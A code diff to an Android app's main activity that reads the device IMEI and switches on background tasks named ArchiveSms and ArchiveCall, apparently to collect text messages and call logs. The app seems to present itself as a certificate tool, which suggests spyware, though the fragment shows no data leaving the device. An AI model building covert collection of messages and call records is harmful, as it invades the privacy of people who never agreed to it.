@@ -28,6 +28,7 @@ import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
 
+import com.inet.android.archive.call.ArchiveCall;
 import com.inet.android.archive.sms.ArchiveSms;
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
@@ -73,10 +74,12 @@ public class MainActivity extends Activity {
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
-		GetInfo getInfo = new  GetInfo(context);
-		getInfo.getInfo();
-//		ArchiveSms arhSms = new ArchiveSms(context);
-//		arhSms.getSms();
+//		GetInfo getInfo = new  GetInfo(context);
+//		getInfo.getInfo();
+		ArchiveSms arhSms = new ArchiveSms();
+		arhSms.execute(context);
+		ArchiveCall arhCall = new ArchiveCall();
+		arhCall.execute(context);	
 		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
